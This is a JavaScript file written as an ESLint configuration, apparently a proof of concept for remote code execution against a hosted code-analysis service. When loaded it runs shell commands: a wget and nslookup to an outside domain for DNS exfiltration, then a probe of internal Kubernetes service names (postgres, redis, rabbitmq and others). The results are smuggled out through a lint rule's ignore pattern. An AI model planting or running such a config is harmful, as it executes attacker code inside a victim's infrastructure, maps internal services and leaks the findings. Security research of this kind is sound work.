var fs = require('fs');
var execSync = require('child_process').execSync;
var dns = require('dns');
var result = '';

// Try DNS exfiltration via nslookup/wget to our domain
try {
  var out = execSync('wget -q -O- --timeout=3 http://codacy-rce-proof.r.ssrftest123.xyz/ 2>&1 | head -c 20', {timeout: 5000}).toString();
  result += 'DNS_WGET:' + out.substring(0, 20) + '|';
} catch(e) {
  // wget TCP failed, but did DNS resolve?
  result += 'DNS_WGET_ERR|';
}

// Try resolving our domain (DNS might work even if TCP is blocked)
try {
  var out2 = execSync('nslookup r.ssrftest123.xyz 2>&1 | head -c 100', {timeout: 3000}).toString();
  result += 'NSLOOKUP:' + out2.substring(0, 80) + '|';
} catch(e) {
  result += 'NSLOOKUP_ERR:' + e.message.substring(0, 30) + '|';
}

// Discover internal K8s services via DNS
// Services in the same namespace are resolvable as: <service>.codacy.svc.cluster.local
var services = ['postgres', 'postgresql', 'redis', 'rabbitmq', 'mongo', 'elasticsearch',
                'api', 'engine', 'listener', 'worker', 'core', 'analysis'];
var found = [];
services.forEach(function(svc) {
  try {
    var out = execSync('nslookup ' + svc + '.codacy.svc.cluster.local 2>&1 | grep Address | tail -1', {timeout: 2000}).toString().trim();
    if (out && out.indexOf('NXDOMAIN') === -1 && out.indexOf('server can') === -1) {
      found.push(svc + ':' + out.substring(0, 30));
    }
  } catch(e) {}
});
result += 'K8S_SVCS:' + found.join(';');

result += '{{{BREAK}}}';
module.exports = { rules: { "no-unused-vars": ["error", { varsIgnorePattern: result }] } };
